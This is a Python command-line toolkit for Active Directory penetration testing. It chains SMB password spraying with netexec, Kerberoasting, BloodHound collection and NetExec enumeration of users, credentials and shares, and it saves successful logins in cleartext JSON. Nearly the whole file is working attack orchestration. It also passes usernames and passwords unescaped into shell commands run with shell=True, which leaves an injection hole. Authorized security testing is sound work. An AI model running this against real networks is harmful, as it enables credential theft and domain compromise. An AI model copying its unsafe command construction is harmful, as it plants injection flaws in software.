#!/usr/bin/env python3
import argparse
import os
import sys
import subprocess
import json
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional

# Import shared configuration
try:
    from config import *
    # Check for required config variables
    required_vars = ['TARGETS', 'DOMAIN_USERS', 'DOMAIN_PASSWORDS', 
                     'NETEXEC_SETTINGS', 'KERBEROAST_SETTINGS', 'BLOODHOUND_SETTINGS',
                     'LOG_DIRECTORY', 'RESULTS_DIRECTORY']
    missing_vars = [var for var in required_vars if var not in globals()]
    if missing_vars:
        print(f"Error: Missing required variables in config.py: {', '.join(missing_vars)}")
        sys.exit(1)
except ImportError:
    print("Error: config.py not found. Please ensure it exists in the current directory.")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def section(text: str):
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text.center(50)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}\n")

    @staticmethod
    def subsection(text: str):
        print(f"\n{Colors.YELLOW}{'-' * 40}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{text}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * 40}{Colors.ENDC}\n")

    @staticmethod
    def command(cmd: str):
        print(f"{Colors.CYAN}[+] Executing: {cmd}{Colors.ENDC}\n")

    @staticmethod
    def success(text: str):
        print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

    @staticmethod
    def error(text: str):
        print(f"{Colors.RED}[-] {text}{Colors.ENDC}")

    @staticmethod
    def info(text: str):
        print(f"{Colors.BLUE}[*] {text}{Colors.ENDC}")

class ADPentestToolkit:
    def __init__(self):
        self.log_dir = Path(LOG_DIRECTORY)
        self.results_dir = Path(RESULTS_DIRECTORY)
        
        # Create necessary directories
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        self.start_time = None
        self.end_time = None
        self.toolkit_path = Path(__file__).parent
        
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def check_tools(self) -> bool:
        """Check if all required tools are available"""
        required_tools = [
            "netexec",
            "GetUserSPNs.py",
            "hashcat",
            "BloodHound.py"
        ]
        
        Logger.section("Checking Required Tools")
        all_tools_available = True
        
        for tool in required_tools:
            # Try different methods to find the tool
            cmd_which = subprocess.run(f"which {tool}", shell=True, capture_output=True, text=True)
            cmd_where = subprocess.run(f"where {tool} 2>nul", shell=True, capture_output=True, text=True)
            
            if cmd_which.returncode == 0:
                Logger.success(f"{tool} found at: {cmd_which.stdout.strip()}")
            elif cmd_where.returncode == 0:
                Logger.success(f"{tool} found at: {cmd_where.stdout.strip()}")
            else:
                # Try common directories
                common_paths = [
                    Path(f"./tools/{tool}"),
                    Path(f"../tools/{tool}"),
                    Path(f"./{tool}"),
                    Path(f"./bin/{tool}")
                ]
                
                found = False
                for path in common_paths:
                    if path.exists() or (path.with_suffix('.exe').exists() or path.with_suffix('.py').exists()):
                        Logger.success(f"{tool} found at: {path.absolute()}")
                        found = True
                        break
                
                if not found:
                    Logger.error(f"{tool} not found in PATH or common directories")
                    all_tools_available = False
        
        if not all_tools_available:
            Logger.error("Some required tools are missing. Please install them before proceeding.")
        
        return all_tools_available
    
    def password_spray(self, targets: List[str], usernames: List[str], passwords: List[str]) -> Dict[str, Any]:
        """Perform password spraying attack against specified targets"""
        Logger.section("Password Spraying")
        
        results = {
            "targets": targets,
            "successful_logins": []
        }
        
        for target in targets:
            Logger.subsection(f"Target: {target}")
            
            for password in passwords:
                Logger.info(f"Trying password: {'*' * len(password)}")
                
                for username in usernames:
                    # Use netexec for SMB password spraying
                    command = f"netexec smb {target} -u {username} -p {password}"
                    output = self.execute_command(command, f"SMB login attempt as {username}")
                    
                    # Check if login was successful
                    if "[+]" in output and "Pwn3d" in output:
                        Logger.success(f"Successful login: {username}:{password} on {target}")
                        results["successful_logins"].append({
                            "target": target,
                            "username": username,
                            "password": password,
                            "protocol": "smb"
                        })
        
        # Save results
        result_file = self.results_dir / f"password_spray_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(result_file, 'w') as f:
            json.dump(results, f, indent=4)
        
        Logger.success(f"Password spray results saved to {result_file}")
        return results
    
    def run_kerberoast(self, targets: List[str]) -> None:
        """Run the Kerberoasting tool against specified targets"""
        Logger.section("Kerberoasting")
        
        # Build command string with targets
        targets_str = " ".join(targets)
        command = f"{self.toolkit_path}/kerberoast.py --targets {targets_str}"
        
        self.execute_command(command, "Kerberoasting attack")
    
    def run_bloodhound(self, targets: List[str]) -> None:
        """Collect Active Directory data using BloodHound"""
        Logger.section("BloodHound Collection")
        
        for target in targets:
            Logger.subsection(f"Target: {target}")
            
            # Use successful credentials from previous tools or from config
            # For example, using first successful login from password spray
            command = f"bloodhound-python -d {BLOODHOUND_SETTINGS['domain']} -u {DOMAIN_USERS[0]} -p {DOMAIN_PASSWORDS[0]} -dc {target} -c {','.join(BLOODHOUND_SETTINGS['collection_methods'])}"
            self.execute_command(command, "BloodHound data collection")
    
    def run_netexec_enum(self, targets: List[str], services: str) -> None:
        """Run NetExec enumeration against specified targets"""
        Logger.section("NetExec Enumeration")
        
        for target in targets:
            Logger.subsection(f"Target: {target}")
            
            # Set configuration for NetExec
            self.execute_command(f"{self.toolkit_path}/netexec-enumerator.py set username {DOMAIN_USERS[0]}", "Setting username")
            self.execute_command(f"{self.toolkit_path}/netexec-enumerator.py set password {DOMAIN_PASSWORDS[0]}", "Setting password")
            self.execute_command(f"{self.toolkit_path}/netexec-enumerator.py set target {target}", "Setting target")
            
            # Run enumeration
            command = f"{self.toolkit_path}/netexec-enumerator.py enum {services}"
            self.execute_command(command, f"Enumerating {services} on {target}")
    
    def run_full_scan(self, targets: Optional[List[str]] = None) -> None:
        """Run a full scan using all available tools"""
        self.start_time = datetime.now()
        scan_targets = targets or TARGETS
        
        if not scan_targets:
            Logger.error("No targets specified. Add targets to config.py or provide them as arguments.")
            return
        
        Logger.section("Starting Full AD Penetration Test")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"Targets: {', '.join(scan_targets)}")
        
        # Check for required tools
        if not self.check_tools():
            return
        
        # 1. Password Spraying
        spray_results = self.password_spray(scan_targets, DOMAIN_USERS, DOMAIN_PASSWORDS)
        
        # 2. NetExec Enumeration (if credentials were found or using default creds)
        if spray_results["successful_logins"] or (DOMAIN_USERS and DOMAIN_PASSWORDS):
            self.run_netexec_enum(scan_targets, "smb,users,creds,spider,policy")
        
        # 3. Kerberoasting
        self.run_kerberoast(scan_targets)
        
        # 4. BloodHound Collection
        self.run_bloodhound(scan_targets)
        
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        Logger.section("AD Penetration Test Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        
        # Save summary
        summary = {
            "start_time": str(self.start_time),
            "end_time": str(self.end_time),
            "duration": str(duration),
            "targets": scan_targets,
            "tools_used": ["password_spray", "netexec", "kerberoast", "bloodhound"],
            "successful_logins": spray_results["successful_logins"]
        }
        
        summary_file = self.results_dir / f"full_scan_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=4)
        
        Logger.success(f"Full scan summary saved to {summary_file}")

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}AD Pentest Toolkit{Colors.ENDC}')
    parser.add_argument('command', choices=['check', 'spray', 'netexec', 'kerberoast', 'bloodhound', 'full'], 
                        help='Command to execute')
    parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames')
    parser.add_argument('-s', '--services', default='smb,users', 
                        help='Services to enumerate with NetExec (comma-separated)')
    
    args = parser.parse_args()
    
    toolkit = ADPentestToolkit()
    
    if args.command == 'check':
        toolkit.check_tools()
    elif args.command == 'spray':
        toolkit.password_spray(args.targets or TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS)
    elif args.command == 'netexec':
        toolkit.run_netexec_enum(args.targets or TARGETS, args.services)
    elif args.command == 'kerberoast':
        toolkit.run_kerberoast(args.targets or TARGETS)
    elif args.command == 'bloodhound':
        toolkit.run_bloodhound(args.targets or TARGETS)
    elif args.command == 'full':
        toolkit.run_full_scan(args.targets)

if __name__ == "__main__":
    main()